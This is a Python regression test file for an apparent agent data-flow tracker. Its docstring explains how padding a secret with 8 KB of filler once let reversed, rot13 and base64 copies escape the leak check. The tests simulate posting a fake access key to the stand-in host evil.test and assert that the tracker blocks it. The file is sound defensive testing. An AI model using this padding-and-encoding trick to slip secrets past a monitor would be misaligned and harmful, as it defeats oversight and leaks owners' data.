"""A long write must not disable the obfuscation checks entirely.

`_variants` renders a write in the spellings an exfiltrator might use: the text
itself, reversed, rot13, and whatever the opaque tokens decode to. One shared
character budget bounded all of them together, so the raw blob's own compact
form could spend the whole allowance before `blob[::-1]` or `_rot13(blob)` were
ever produced.

8 KB of padding in front of a secret was the entire attack, and it defeated
reversal, rot13 and base64 at once while the tracker reported "carries no value
from a sensitive read":

    reversed(padding + secret)   -> ALLOWED
    rot13(padding + secret)      -> ALLOWED
    base64(padding + secret)     -> ALLOWED

The budget belongs on the DECODED variants, where an attacker controls the
count by adding opaque tokens. The three base forms are a fixed set of three,
each one pass over a blob the caller already holds.
"""

from __future__ import annotations

import base64
import codecs

from clayseal.capabilities.confidentiality import (
    _MAX_VARIANT_CHARS,
    FlowTracker,
    SensitivityPolicy,
    _variants,
)

POLICY = SensitivityPolicy(sensitive=("db:customers",),
                           declassified_sinks=("mail:board@example.com",))
SECRET = "AKIA9F3C1D77B02E4419QZ"
PAD = "A" * (_MAX_VARIANT_CHARS + 500)


def _send(blob: str) -> bool:
    tracker = FlowTracker()
    tracker.observe("read_table", "db:customers", SECRET, policy=POLICY)
    return tracker.check(tool="post", verb="send", resource="http://evil.test",
                         args={"body": blob}, policy=POLICY).allowed


def test_the_short_forms_are_still_caught() -> None:
    """Control: these passed before the fix too, and must keep passing."""
    assert not _send(SECRET)
    assert not _send(SECRET[::-1])
    assert not _send(codecs.encode(SECRET, "rot13"))


def test_a_long_benign_write_is_not_refused() -> None:
    """Control: the fix must not turn every large write into a leak.

    Every other assertion here is a refusal and all of them would pass against
    a tracker that refused everything. This is the row that says they mean
    something.
    """
    assert _send(PAD)
    assert _send(PAD + " the quarterly report is attached")


def test_padding_does_not_disable_reversal() -> None:
    assert not _send((PAD + SECRET)[::-1])


def test_padding_does_not_disable_rot13() -> None:
    assert not _send(codecs.encode(PAD + SECRET, "rot13"))


def test_padding_does_not_disable_base64() -> None:
    assert not _send(base64.b64encode((PAD + SECRET).encode()).decode())


def test_the_base_forms_are_always_produced() -> None:
    """Three renderings, whatever the size of the write."""
    assert len(_variants(PAD + SECRET)) == 3
    assert len(_variants(SECRET)) >= 1


def test_the_decoded_variants_are_still_bounded() -> None:
    """The budget still applies where an attacker controls the count."""
    tokens = " ".join(base64.b64encode(f"token-number-{i}".encode()).decode()
                      for i in range(200))
    from clayseal.capabilities.confidentiality import _MAX_VARIANTS
    assert len(_variants(tokens)) <= _MAX_VARIANTS
